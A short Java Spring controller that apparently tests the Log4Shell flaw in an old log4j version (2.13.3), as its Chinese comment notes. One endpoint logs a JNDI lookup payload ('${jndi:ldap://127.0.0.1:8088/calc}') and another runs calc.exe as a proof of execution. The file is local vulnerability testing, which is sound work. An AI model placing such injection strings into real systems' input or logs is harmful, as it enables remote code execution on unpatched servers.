package client.demo.test;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;

/**
 * @author Qiuxinchao
 * @version 1.0
 * @date 2022/3/26 14:55
 * @describe  原先版本测试，的确会有 远程执行代码风险
 *    代码参考    https://zhuanlan.zhihu.com/p/445150194  原先版本 2.13.3
 */
//@RestController
@RequestMapping("/attack")
public class AttackController {

    private static Logger logger = LoggerFactory.getLogger(AttackController.class);

    @GetMapping("/calc")
    public String cals(){
        String error = "${java:version}";
        logger.error("============, {}",error);
        error = "${jndi:ldap://127.0.0.1:8088/calc}";
        logger.error("=============,{}",error);
        return "ok";
    }

    @GetMapping("/exec")
    public void exec(){
        try {
            Runtime.getRuntime().exec("calc.exe");
        }
        catch (IOException e){
            e.printStackTrace();
        }
    }


}
